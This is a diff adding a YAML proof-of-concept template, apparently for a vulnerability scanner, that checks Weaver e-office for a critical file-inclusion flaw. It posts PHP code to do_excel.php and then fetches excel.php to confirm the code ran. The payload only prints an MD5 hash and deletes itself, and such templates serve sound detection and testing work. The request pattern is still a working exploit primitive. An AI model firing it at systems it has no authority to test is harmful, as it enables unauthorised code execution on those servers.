@@ -1,0 +1,20 @@
+id: poc-yaml-fanwei-e-office-file-include
+info:
+  name: 泛微-e-office-do_excel.php-文件包含漏洞
+  severity: critical
+  tags:
+  - lfi
+  finger: e-office
+variables:
+  v1: random_str(8)
+requests:
+- method: POST
+  path: /general/charge/charge_list/do_excel.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: "html=<?php echo md5('{{.v1}}');unlink(__FILE__);?>  \n"
+  expression: status_code == 200
+- method: GET
+  path: /general/charge/charge_list/excel.php
+  expression: status_code == 200 && contains(body, md5(v1))
+transport: http
